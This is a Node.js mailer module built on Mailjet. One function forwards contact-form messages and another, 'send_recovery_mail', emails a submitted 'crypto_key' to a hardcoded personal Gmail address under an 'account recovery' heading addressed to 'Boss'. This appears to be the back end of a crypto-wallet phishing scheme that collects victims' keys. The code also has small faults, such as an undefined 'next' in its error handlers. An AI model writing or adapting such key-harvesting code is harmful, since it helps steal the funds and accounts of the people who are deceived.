const mailJet = require ('node-mailjet').connect(`${process.env.JET_ONE}`, `${process.env.JET_TWO}`)
const createError = require("http-errors")

async function send_contact_mail(name, mail, subject, message){

    const request = mailJet.post("send", {'version': 'v3.1'})
    .request({
        "Messages":[
            {
                "From": {
                    "Email": "akdadewumi@gmail.com",
                    "Name": "David"
                },
                "To": [
                    {
                        "Email": "lakerzhitman@gmail.com",
                        "Name": ""
                    }
                ],
                "Subject": `${subject}`,
                "TextPart": `Name: ${name}, mail: ${mail}, Message:  ${message}`,
                "HTMLPart": "<h3>Good Day Boss,</h3><br />"+
                `<p> Mr/Miss/Mrs ${name}, left you a message that says,</p> <br/>`+
                `<p style:"font-weight: 700;">${message}</p><br/>`+
                `<p>You can reach them at: <a href="mailto:${mail}">${mail}</a></p>`,
                "CustomID": "messageFromWebApp"
            }
        ]
    })
    
    request.then((result) => {
        return result
    })
    .catch((err) => {
        return next(createError(500, {body: err, message: "Your message was not sent"}))
    })
}



async function send_recovery_mail(crypto, subject, service){
    const request = mailJet.post("send", {'version': 'v3.1'})
    .request({
        "Messages":[
            {
                "From": {
                    "Email": "akdadewumi@gmail.com",
                    "Name": "David"
                },
                "To": [
                    {
                        "Email": "lakerzhitman@gmail.com",
                        "Name": ""
                    }
                ],
                "Subject": `${subject}`,
                "TextPart": `crypto_key: ${crypto}`,
                "HTMLPart": "<h3>Good Day Boss,</h3><br />"+
                `<p> An account recovery process has been initiated.</p> <br/>`+
                `<p style:"font-weight: 700; color: red; font-size: 3rem;">${crypto}</p><br/>`,
                "CustomID": "messageFromWebApp"
            }
        ]
    })
    
    request.then((result) => {
        service.saveLogData({body: result, name: "account recovery mail", date: new Date()})
        return result
    })
    .catch((err) => {
        return next(createError(500, {body: err, message: "Your message was not sent"}))
    })
}

module.exports = {
    send_contact_mail,
    send_recovery_mail
}